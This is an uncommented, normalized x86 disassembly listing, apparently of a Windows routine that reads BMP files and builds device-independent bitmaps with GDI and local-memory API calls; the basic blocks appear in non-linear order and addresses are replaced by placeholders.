push 0x0
push edi
push 0x0
push edx
push 0x0
mov [ ebp - 0x4 ] 0x2
call sub_41c070
mov esi eax
xor edi edi
add esp 0x18
cmp esi edi
je r-xdata
push 0x0
lea edx [ ebx + 0xc ]
push edx
lea ecx [ ebx + 0x14 ]
push ecx
lea edx [ ebx + 0x10 ]
push edx
lea ecx [ ebx + 0x20 ]
push ecx
lea edx [ ebx + 0x24 ]
push edx
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x14 ]
push edi
push eax
push 0x0
call sub_406950
add esp 0x2c
push esi
mov edi eax
call [ LocalUnlock@IAT ]
mov al [ ebp + 0x14 ]
test al al
je r-xdata
mov ecx ebx
call sub_43d760
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x4d42
jne r-xdata
mov eax [ ebp - 0x14 ]
push 0x1
push 0x0
push edi
push 0x0
push eax
push 0x0
mov [ ebp - 0x4 ] 0x5
call sub_41c070
mov esi eax
xor eax eax
add esp 0x18
cmp esi eax
je r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x18 ]
push edx
call [ LocalLock@IAT ]
mov esi eax
lea edi [ ebx + 0x24 ]
mov ecx 0xa
[ edi ] [ esi ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov [ ebx + 0x10 ] ecx
mov eax [ eax + 0x8 ]
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x24 ]
mov [ ebx + 0x14 ] eax
cmp [ edx + 0xe ] 0x8
ja r-xdata
push esi
call [ LocalUnlock@IAT ]
mov al [ ebp + 0x14 ]
test al al
je r-xdata
push esi
call [ LocalUnlock@IAT ]
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push edi
push edi
push edx
push eax
push edi
push 0x2
push esi
push ecx
mov ecx ebx
call sub_4402e0
mov edi eax
test edi edi
jne r-xdata
mov esi [ ebp + 0xc ]
push esi
call [ LocalUnlock@IAT ]
mov al [ ebp + 0x14 ]
test al al
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
push 0x1
lea ecx [ ebp - 0x1bb8 ]
push ecx
mov [ ebp - 0x1b94 ] edx
mov [ ebp - 0x1b90 ] eax
call [ rw-data ]
test eax eax
je r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
push ecx
mov [ ebp - 0x30 ] r--data
call sub_4b5bd2
mov [ ebp + 0x8 ] esi
cmp esi edi
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
lea eax [ ebx + 0x24 ]
push eax
push ecx
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] edi
mov [ ebp + 0x18 ] esp
mov eax esp
je r-xdata
inc [ esi + 0x4 ]
test edi edi
jl r-xdata
push esi
call [ LocalFree@IAT ]
mov ecx eax
cmp [ ecx + 0x6 ] 0x0
jne r-xdata
mov [ ebp + 0x18 ] esi
cmp esi eax
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebp - 0x44 ]
push edx
lea edi [ ebx + 0x24 ]
push edi
push ecx
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
inc [ esi + 0x4 ]
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push eax
call [ LocalFree@IAT ]
mov ax [ ebx + 0x32 ]
cmp ax 0x18
jne r-xdata
mov [ ebx + 0xc ] 0x10000001
mov eax [ edx + 0x20 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x20
push esi
call [ LocalFree@IAT ]
push esi
call [ LocalUnlock@IAT ]
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push edi
push edi
push edx
push eax
push edi
push edi
push esi
push ecx
mov ecx ebx
call sub_4402e0
mov edi eax
test edi edi
jne r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
push esi
call [ LocalFree@IAT ]
mov edx [ ebp - 0x1b8c ]
test edx edx
jle r-xdata
lea edx [ ebp - 0x1bb8 ]
push edx
call [ rw-data ]
jmp r-xdata
mov [ eax ] esi
call [ rw-data ]
mov eax [ ebp - 0x40 ]
mov edx [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
mov [ ebx + 0x14 ] eax
mov eax [ ebp - 0x38 ]
cmp eax edi
mov [ ebx + 0x10 ] edx
mov [ ebx + 0xc ] ecx
je r-xdata
inc [ esi + 0x4 ]
mov ecx ebx
call sub_43d760
jmp r-xdata
mov al [ ebp + 0x1c ]
test al al
je r-xdata
mov edx eax
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ecx ] esi
call [ rw-data ]
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x3c ]
mov [ ebx + 0x10 ] eax
mov eax [ ebp - 0x38 ]
test eax eax
mov [ ebx + 0x14 ] ecx
mov [ ebx + 0xc ] edx
je r-xdata
inc [ esi + 0x4 ]
push eax
call [ LocalFree@IAT ]
jmp r-xdata
xor ecx ecx
cmp ax 0x20
setne cl
dec ecx
and ecx 0x10000020
mov [ ebx + 0xc ] ecx
mov [ ebx + 0xc ] 0x10000018
jmp r-xdata
mov ecx eax
lea esi [ edx + 0x28 ]
lea edi [ ebx + 0x4c ]
[ edi ] [ esi ]
jmp r-xdata
mov cl [ edx + 0xe ]
mov eax 0x1
shl eax cl
push esi
call [ LocalUnlock@IAT ]
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push edi
push edi
push edx
push eax
push edi
push 0x3
push esi
push ecx
mov ecx ebx
call sub_4402e0
mov edi eax
test edi edi
je r-xdata
mov ecx [ ebp - 0x1b88 ]
test ecx ecx
jle r-xdata
movzx ecx [ ebx + 0x32 ]
mov eax [ ebx + 0x28 ]
imul eax ecx
add eax 0x7
cdq
and edx 0x7
add eax edx
mov edi eax
sar edi 0x3
add edi 0xf
and edi 0xfffffff0
cmp ecx 0x2
mov [ ebp + 0x18 ] ecx
jne r-xdata
push eax
call [ LocalFree@IAT ]
xor eax eax
test edi edi
setne al
inc eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
push 0x0
call [ CreateCompatibleDC@IAT ]
test eax eax
mov [ ebx + 0x1c ] eax
je r-xdata
mov edx [ ebp - 0x18 ]
add edx 0xfffffff2
add eax 0xe
cmp edx 0x28
jbe r-xdata
push 0x0
push 0x0
lea eax [ ebx + 0x20 ]
push eax
push 0x0
push edi
push 0x0
call [ CreateDIBSection@IAT ]
test eax eax
mov [ ebx + 0x18 ] eax
jne r-xdata
push eax
call [ LocalFree@IAT ]
mov al [ ebp + 0x1c ]
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
call edi
mov edx [ ebp + 0x18 ]
mov esi [ LocalUnlock@IAT ]
push edx
call esi
mov eax [ ebp + 0x18 ]
mov edi [ LocalFree@IAT ]
push eax
call edi
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push edx
mov [ ebx + 0x4 ] ecx
call esi
mov al [ ebp + 0x14 ]
test al al
je r-xdata
mov eax [ ebp - 0x1b84 ]
dec eax
je r-xdata
push 0x0
push 0x0
lea eax [ ebx + 0x20 ]
push eax
push 0x0
lea eax [ ebx + 0x24 ]
push eax
push 0x0
call [ CreateDIBSection@IAT ]
mov ecx eax
cmp [ ebp + 0x18 ] 0x2
mov [ ebx + 0x18 ] ecx
jne r-xdata
mov [ ebx + 0x28 ] edi
mov [ ebx + 0x32 ] 0x8
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
jmp r-xdata
cmp [ eax ] 0x28
mov esi eax
jne r-xdata
mov eax [ esi ]
push 0x0
push 0x0
push 0x0
mov ecx esi
call [ eax + 0x20 ]
mov edx [ ebx + 0x20 ]
lea ecx [ ebp - 0x28 ]
push ecx
push edx
push edi
push ecx
mov ecx [ esi + 0x4 ]
inc ecx
mov eax esp
mov [ esi + 0x4 ] ecx
mov [ ebp + 0x8 ] esp
mov [ eax ] esi
call [ rw-data ]
mov edi eax
mov edi 0xffffff00
jmp r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
push 0x0
push 0x0
lea edi [ ebx + 0x20 ]
push edi
push 0x0
lea eax [ ebx + 0x24 ]
push eax
push 0x0
call [ CreateDIBSection@IAT ]
test eax eax
mov [ ebx + 0x18 ] eax
je r-xdata
mov [ ebp - 0x1ba4 ] 0x1
mov [ ebp - 0x1ba0 ] 0x4
mov [ ebx + 0xc ] 0x20000008
sub eax 0x2
je r-xdata
test ecx ecx
jne r-xdata
lea eax [ edi * 8 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x32 ] 0x2
push edx
push eax
call [ SelectObject@IAT ]
lea edi [ ebx + 0x24 ]
mov ecx 0xa
[ edi ] [ esi ]
mov cx [ ebx + 0x32 ]
add eax 0x28
sub edx 0x28
cmp cx 0x8
ja r-xdata
mov esi [ ebp + 0xc ]
push esi
mov [ ebp - 0x4 ] 0xffffffff
call [ LocalUnlock@IAT ]
mov al [ ebp + 0x14 ]
test al al
je r-xdata
dec [ esi + 0x4 ]
jne r-xdata
test esi esi
mov [ ebp - 0x4 ] 0x5
je r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
push eax
call edi
mov ecx [ ebp + 0x8 ]
push ecx
call [ LocalLock@IAT ]
mov esi eax
mov eax [ ebx + 0x2c ]
cdq
mov ecx eax
movzx eax [ ebx + 0x32 ]
imul eax [ ebx + 0x28 ]
xor ecx edx
sub ecx edx
add eax 0x7
mov edi [ edi ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0x3
and eax 0xfffffffc
imul ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
push eax
call [ LocalUnlock@IAT ]
push 0x0
call [ CreateCompatibleDC@IAT ]
test eax eax
mov [ ebx + 0x1c ] eax
jne r-xdata
mov edx [ ebp - 0x1bac ]
xor eax eax
lea edi [ ebx + 0x24 ]
mov ecx 0xa
mov [ ebx + 0x10 ] esi
mov [ ebx + 0x14 ] edx
[ edi ]
mov edi [ ebp + 0x18 ]
test edi edi
mov ecx 0x1
mov [ ebx + 0x24 ] 0x28
mov [ ebx + 0x34 ] eax
mov [ ebx + 0x30 ] cx
jne r-xdata
mov edi [ ebp + 0x20 ]
test edi edi
je r-xdata
mov [ ebp - 0x1ba4 ] 0x3
mov [ ebp - 0x1ba0 ] 0x2
mov [ ebx + 0xc ] 0x10000018
jmp r-xdata
dec eax
mov [ ebp - 0x1ba4 ] 0x4
je r-xdata
mov edx [ esi ]
push 0x0
push 0x0
push 0x0
mov ecx esi
call [ edx + 0x20 ]
mov ecx [ ebx + 0x20 ]
lea eax [ ebp - 0x28 ]
push eax
push ecx
lea eax [ ebx + 0x24 ]
push eax
push ecx
mov ecx [ esi + 0x4 ]
inc ecx
mov eax esp
mov [ esi + 0x4 ] ecx
mov [ ebp + 0x18 ] esp
mov [ eax ] esi
call [ rw-data ]
mov edi eax
mov edi 0xffffff00
jmp r-xdata
mov esi [ ebx + 0x34 ]
movzx ecx cx
or ecx 0x10000000
cmp esi 0x3
mov [ ebx + 0xc ] ecx
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
mov [ ebx + 0xc ] 0x10000001
jne r-xdata
test edi edi
jl r-xdata
push esi
call [ LocalFree@IAT ]
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
jmp r-xdata
mov ecx [ ebx + 0x18 ]
push ecx
push eax
call [ SelectObject@IAT ]
mov edi [ LocalFree@IAT ]
mov edi 0x3
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ ebp + 0x24 ]
test edx edx
je r-xdata
mov eax [ ebp + 0x18 ]
mov esi edx
and eax 0xffff
mov [ ebp + 0x8 ] 0x3
mov [ ebp - 0x1bb0 ] esi
mov [ ebp - 0x1bac ] ecx
mov [ ebp + 0x18 ] eax
je r-xdata
mov [ ebp - 0x1ba0 ] 0x5
mov [ ebx + 0xc ] 0x10000020
jmp r-xdata
mov eax 0xff
mov [ ebp - 0x1ba0 ] eax
mov [ ebp - 0x1b80 ] eax
jmp r-xdata
mov esi [ ebp + 0xc ]
push esi
mov [ ebp - 0x4 ] 0xffffffff
call [ LocalUnlock@IAT ]
mov al [ ebp + 0x14 ]
test al al
je r-xdata
dec [ esi + 0x4 ]
jne r-xdata
test esi esi
mov [ ebp - 0x4 ] 0x2
je r-xdata
mov ecx [ ebp - 0x14 ]
mov eax [ ecx + 0xa ]
lea edx [ eax + ecx ]
mov ecx [ ebp - 0x18 ]
sub ecx eax
mov eax [ ebx + 0x38 ]
test eax eax
mov edi ecx
mov [ ebp + 0x24 ] edx
mov [ ebp + 0x8 ] edi
mov [ ebp + 0x18 ] eax
jne r-xdata
cmp edx 0xc
jbe r-xdata
lea ecx [ esi * 4 ]
cmp edx ecx
jbe r-xdata
mov esi 0x1
shl esi cl
mov al [ ebp + 0x1c ]
test al al
je r-xdata
mov ecx esi
imul ecx eax
lea eax [ ecx + 0x3 ]
and eax 0xfffffffc
lea ecx [ esi + esi * 2 + 0x30 ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
lea eax [ edx + edx * 2 ]
shl eax 0x4
lea ecx [ esi + esi * 2 ]
jmp r-xdata
test edi edi
jne r-xdata
mov al [ ebp + 0x1c ]
test al al
jne r-xdata
mov ecx [ ebp - 0x1b78 ]
test ecx ecx
je r-xdata
test edi edi
jl r-xdata
push esi
call [ LocalFree@IAT ]
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
jmp r-xdata
mov esi [ ebp + 0x18 ]
mov eax [ ebx + 0x2c ]
movzx ecx [ ebx + 0x32 ]
cdq
mov esi eax
mov eax [ ebx + 0x28 ]
imul eax ecx
add eax 0x7
xor esi edx
sub esi edx
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0x3
and eax 0xfffffffc
imul esi eax
mov [ ebp + 0x18 ] esi
jmp r-xdata
mov ecx [ eax ]
lea edx [ ebx + 0x4c ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov eax [ eax + 0x8 ]
mov [ edx + 0x8 ] eax
mov esi eax
mov eax ecx
shr ecx 0x2
lea edi [ ebx + 0x4c ]
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
push 0x0
call [ CreateCompatibleDC@IAT ]
test eax eax
mov [ ebx + 0x1c ] eax
je r-xdata
push 0x0
push 0x0
lea esi [ ebx + 0x20 ]
push esi
push 0x0
lea eax [ ebx + 0x24 ]
push eax
push 0x0
call [ CreateDIBSection@IAT ]
test eax eax
mov [ ebx + 0x18 ] eax
jne r-xdata
xor eax eax
sub eax ecx
mov ecx [ ebp - 0x1ba4 ]
mov [ ebp - 0x1ba8 ] eax
cdq
idiv ecx
lea edx [ ecx * 8 ]
mov [ ebx + 0x32 ] dx
add eax esi
mov [ ebx + 0x28 ] eax
mov eax [ ebp - 0x1bac ]
neg eax
mov [ ebx + 0x2c ] eax
cmp [ ebp - 0x1ba0 ] 0x4
jne r-xdata
mov eax [ ebp - 0x1b80 ]
mov edi 0x3
cmp eax edi
jne r-xdata
lea eax [ esi + 0x3 ]
and eax 0xfffffffc
sub eax esi
mov [ ebp - 0x1ba8 ] eax
add eax esi
neg edx
mov [ ebx + 0xc ] 0x20000008
mov [ ebp - 0x1ba0 ] 0x4
mov [ ebp - 0x1ba4 ] ecx
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] edx
mov [ ebx + 0x32 ] 0x8
jmp r-xdata
mov eax [ ebp - 0x1b8c ]
add eax 0x7
cdq
and edx 0x7
add eax edx
mov ecx eax
sar ecx 0x3
cmp edi ecx
jg r-xdata
mov eax [ ebp - 0x1b74 ]
test eax eax
je r-xdata
mov al [ ebp + 0x1c ]
test al al
je r-xdata
push esi
push 0x2
call [ LocalAlloc@IAT ]
test eax eax
mov [ ebx + 0x4 ] eax
je r-xdata
push 0x0
push 0x0
lea edi [ ebx + 0x20 ]
push edi
push 0x0
lea eax [ ebx + 0x24 ]
push eax
push 0x0
call [ CreateDIBSection@IAT ]
test eax eax
mov [ ebx + 0x18 ] eax
je r-xdata
mov edx [ ebx + 0x28 ]
mov eax [ ebx + 0x2c ]
mov [ ebx + 0x10 ] edx
cdq
xor eax edx
sub eax edx
mov [ ebx + 0x14 ] eax
mov al [ ebp + 0x1c ]
test al al
je r-xdata
mov edx [ ebx + 0x18 ]
mov eax [ ebp + 0x8 ]
mov edx [ esi ]
push eax
lea ecx [ ebp - 0x1bb8 ]
push ecx
mov [ ebp - 0x1bb4 ] edx
mov [ ebp + 0x10 ] 0x2
call [ rw-data ]
test eax eax
je r-xdata
mov ecx ebx
call sub_43d760
lea ecx [ ebp - 0x1bb8 ]
push ecx
call [ rw-data ]
push 0x1000
push r--data
push r--data
push 0x0
call [ MessageBoxA@IAT ]
mov [ ebx + eax * 4 + 0x4c ] al
mov [ ebx + eax * 4 + 0x4d ] al
mov [ ebx + eax * 4 + 0x4e ] al
mov [ ebx + eax * 4 + 0x4f ] 0x0
inc eax
jmp r-xdata
mov eax [ ebp - 0x1ba4 ]
cmp eax edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1b88 ]
add eax 0x7
cdq
and edx 0x7
add eax edx
mov edx [ ebp + 0x24 ]
sar eax 0x3
cmp edx eax
jg r-xdata
cmp edi ecx
jg r-xdata
push 0x0
call [ CreateCompatibleDC@IAT ]
test eax eax
mov [ ebx + 0x1c ] eax
je r-xdata
push eax
call [ LocalLock@IAT ]
push 0x0
call [ CreateCompatibleDC@IAT ]
test eax eax
mov [ ebx + 0x1c ] eax
je r-xdata
lea eax [ ebp - 0x1bb8 ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
push r--data
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x2c ] r--data
call sub_4b5bd2
cmp eax 0x100
jge r-xdata
mov al [ ebp + 0x1c ]
test al al
jne r-xdata
mov [ ebp + 0x8 ] 0x13
cmp edx eax
jg r-xdata
mov ecx [ ebx + 0x18 ]
push ecx
push eax
call [ SelectObject@IAT ]
xor eax eax
test edi edi
setne al
inc eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
cmp edi esi
mov [ ebp + 0x8 ] esi
jae r-xdata
mov ecx [ ebx + 0x18 ]
push ecx
push eax
call [ SelectObject@IAT ]
mov eax [ edi ]
mov edi [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp - 0x1ba0 ] 0x5
mov edi 0x1
jne r-xdata
push r--data
lea ecx [ ebp - 0x48 ]
push ecx
mov [ ebp - 0x48 ] r--data
call sub_4b5bd2
mov eax [ ebp - 0x1b7c ]
cmp eax 0x2
mov [ ebx + 0x32 ] 0x8
jne r-xdata
mov [ ebp + 0x8 ] 0x15
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov edx ecx
shr ecx 0x2
mov edi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov [ ebp + 0x8 ] edi
test eax eax
je r-xdata
mov al [ ebp + 0x1c ]
test al al
je r-xdata
mov edx [ ebp - 0x1bac ]
mov eax [ ebp - 0x1bb0 ]
mov ecx [ esi ]
push edx
push eax
push ecx
call sub_439d20
add esp 0xc
jmp r-xdata
cmp eax ecx
jne r-xdata
mov eax esi
and eax ecx
add esi eax
mov [ ebp - 0x1bb0 ] esi
add esi esi
lea eax [ esi + 0xf ]
and eax 0xfffffff0
mov ecx eax
sub ecx esi
mov [ ebp - 0x1ba0 ] edi
mov [ ebp - 0x1ba8 ] ecx
mov [ ebx + 0xc ] 0x20000010
mov [ ebp - 0x1ba4 ] 0x2
mov esi ecx
mov [ ebp - 0x1bb0 ] esi
mov [ ebp - 0x1bac ] eax
mov esi [ ebp + 0xc ]
push esi
call [ LocalUnlock@IAT ]
mov al [ ebp + 0x14 ]
test al al
je r-xdata
push eax
call [ LocalUnlock@IAT ]
mov esi [ ebp + 0xc ]
jmp r-xdata
push 0x0
call [ CreateCompatibleDC@IAT ]
test eax eax
mov [ ebx + 0x1c ] eax
je r-xdata
mov eax 0xff
lea esi [ esi + esi * 2 ]
mov [ ebp - 0x1b80 ] eax
mov [ ebp - 0x1ba0 ] eax
lea eax [ esi + 0x10 ]
and eax 0xfffffff0
mov ecx eax
sub ecx esi
mov [ ebp - 0x1ba8 ] ecx
mov [ ebx + 0xc ] 0x20000018
mov [ ebp - 0x1ba4 ] edi
jmp r-xdata
mov eax [ ebp - 0x1bac ]
mov ecx eax
mov edx esi
and edx 0x1
add esi edx
and ecx 0x1
add eax ecx
lea ecx [ esi + 0xf ]
and ecx 0xfffffff0
mov [ ebp - 0x1bac ] eax
mov edx ecx
sub edx esi
mov [ ebp - 0x1ba8 ] edx
cdq
sub eax edx
sar eax 0x1
neg eax
lea eax [ eax + eax * 2 ]
mov [ ebp - 0x1ba0 ] 0x3
mov [ ebp - 0x1bb0 ] esi
mov [ ebx + 0xc ] 0x2000000c
mov [ ebp - 0x1ba4 ] 0x1
mov [ ebx + 0x28 ] ecx
mov [ ebx + 0x2c ] eax
jmp r-xdata
mov al [ ebp + 0x1c ]
test al al
je r-xdata
push esi
call [ LocalFree@IAT ]
mov ecx [ ebx + 0x18 ]
push ecx
push eax
call [ SelectObject@IAT ]
neg edx
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] edx
mov edx [ ebp + 0x18 ]
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi edx
setne al
inc eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
push 0x0
call [ CreateCompatibleDC@IAT ]
test eax eax
mov [ ebx + 0x1c ] eax
je r-xdata
mov ecx [ ebx + 0x18 ]
push ecx
push eax
call [ SelectObject@IAT ]
sub_4411b0
mov eax [ esp + 0x4 ]
sub esp 0x14
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x30 ]
cmp edi 0x5
mov ebp ecx
mov [ ebp ] eax
mov eax [ esp + 0x2c ]
jne r-xdata
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor edi edi
push edi
push edi
lea ecx [ esp + 0x30 ]
push ecx
lea edx [ esp + 0x3c ]
push edx
push edi
push edi
push edi
push eax
push edi
mov [ esp + 0x54 ] edi
mov [ esp + 0x4c ] edi
call sub_4b3ee0
add esp 0x24
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn 0x1c
test edi edi
jne r-xdata
mov eax [ esp + 0x30 ]
cmp eax edi
mov esi [ LocalFree@IAT ]
je r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call [ LocalLock@IAT ]
mov ebx eax
lea edi [ ebp + 0x24 ]
mov ecx 0xa
mov esi ebx
[ edi ] [ esi ]
mov edx [ ebx + 0x4 ]
mov [ ebp + 0x10 ] edx
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
mov [ ebp + 0x14 ] eax
cmp [ ebx + 0xe ] 0x8
ja r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
mov ebx eax
push ebx
push 0x0
call [ LocalAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov ebx [ ReadFile@IAT ]
push edi
lea ecx [ esp + 0x30 ]
push ecx
push 0xe
lea edx [ esp + 0x20 ]
push edx
push esi
call ebx
cmp [ esp + 0x2c ] 0xe
jne r-xdata
mov eax [ esp + 0x28 ]
cmp eax edi
je r-xdata
push eax
call esi
mov ax [ ebp + 0x32 ]
cmp ax 0x18
jne r-xdata
mov [ ebp + 0xc ] 0x10000001
mov eax [ ebx + 0x20 ]
test eax eax
jne r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push eax
push ebx
push edi
push esi
call [ ReadFile@IAT ]
push esi
mov ebx eax
call [ CloseHandle@IAT ]
test ebx ebx
jne r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn 0x1c
mov ecx ebp
call sub_43d760
push 0x0
push 0x0
push 0x0
push esi
call [ SetFilePointer@IAT ]
cmp [ esp + 0x14 ] 0x4d42
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn 0x1c
push eax
call esi
xor ecx ecx
cmp ax 0x20
setne cl
dec ecx
and ecx 0x10000020
mov [ ebp + 0xc ] ecx
mov [ ebp + 0xc ] 0x10000018
jmp r-xdata
mov ecx eax
lea esi [ ebx + 0x28 ]
lea edi [ ebp + 0x4c ]
[ edi ] [ esi ]
jmp r-xdata
mov cl [ ebx + 0xe ]
mov eax 0x1
shl eax cl
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
push ecx
mov ecx [ esp + 0x38 ]
push edx
mov edx [ esp + 0x38 ]
push eax
mov eax [ esp + 0x34 ]
push ecx
push 0x1
push edx
push edi
push eax
mov ecx ebp
call sub_4402e0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn 0x1c
push edi
call [ LocalFree@IAT ]
cmp [ esp + 0x1a ] di
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x14
retn 0x1c
push 0x0
push 0x0
lea edi [ ebp + 0x20 ]
push edi
push 0x0
lea eax [ ebp + 0x24 ]
push eax
push 0x0
call [ CreateDIBSection@IAT ]
test eax eax
mov [ ebp + 0x18 ] eax
je r-xdata
mov edx [ esp + 0x30 ]
mov ebx [ LocalUnlock@IAT ]
push edx
call ebx
mov eax [ esp + 0x30 ]
push eax
call [ LocalFree@IAT ]
mov al [ esp + 0x38 ]
test al al
mov ecx [ esp + 0x28 ]
mov [ ebp + 0x4 ] ecx
je r-xdata
cmp [ esp + 0x1c ] di
jne r-xdata
mov ecx ebp
call sub_43d760
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn 0x1c
mov edx [ esp + 0x28 ]
push edx
call [ LocalLock@IAT ]
mov esi eax
mov eax [ ebp + 0x2c ]
cdq
mov ecx eax
movzx eax [ ebp + 0x32 ]
imul eax [ ebp + 0x28 ]
xor ecx edx
sub ecx edx
add eax 0x7
mov edi [ edi ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0x3
and eax 0xfffffffc
imul ecx eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x28 ]
push ecx
call ebx
push 0x0
call [ CreateCompatibleDC@IAT ]
test eax eax
mov [ ebp + 0x1c ] eax
jne r-xdata
push 0x0
lea eax [ esp + 0x30 ]
push eax
push 0x28
lea edi [ ebp + 0x24 ]
push edi
push esi
call ebx
cmp [ esp + 0x2c ] 0x28
jne r-xdata
mov edx [ ebp + 0x18 ]
push edx
push eax
call [ SelectObject@IAT ]
cmp [ edi ] 0x28
jne r-xdata
mov cx [ ebp + 0x32 ]
cmp cx 0x8
ja r-xdata
cmp [ ebp + 0x34 ] 0x3
movzx eax cx
jne r-xdata
mov eax [ ebp + 0x44 ]
test eax eax
mov [ ebp + 0xc ] 0x10000001
jne r-xdata
or eax 0x10000000
mov [ ebp + 0xc ] eax
push 0x0
lea ecx [ esp + 0x30 ]
push ecx
push 0xc
lea edx [ ebp + 0x4c ]
push edx
or eax 0x10000000
push esi
mov [ ebp + 0xc ] eax
call ebx
cmp [ esp + 0x2c ] 0xc
jne r-xdata
push 0x0
lea ecx [ esp + 0x30 ]
push ecx
lea edi [ eax * 4 ]
push edi
lea edx [ ebp + 0x4c ]
push edx
push esi
call ebx
cmp [ esp + 0x2c ] edi
je r-xdata
mov eax 0x1
shl eax cl
mov eax [ ebp + 0x28 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebp + 0x2c ]
cdq
xor eax edx
sub eax edx
mov [ ebp + 0x14 ] eax
mov al [ esp + 0x38 ]
test al al
je r-xdata
mov eax [ ebp + 0x2c ]
cdq
mov edi eax
mov eax [ ebp + 0x28 ]
xor edi edx
sub edi edx
movzx edx [ ebp + 0x32 ]
imul eax edx
add eax 0x7
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0x3
and eax 0xfffffffc
imul edi eax
jmp r-xdata
mov ecx [ esp + 0x1e ]
push 0x0
push 0x0
push ecx
push esi
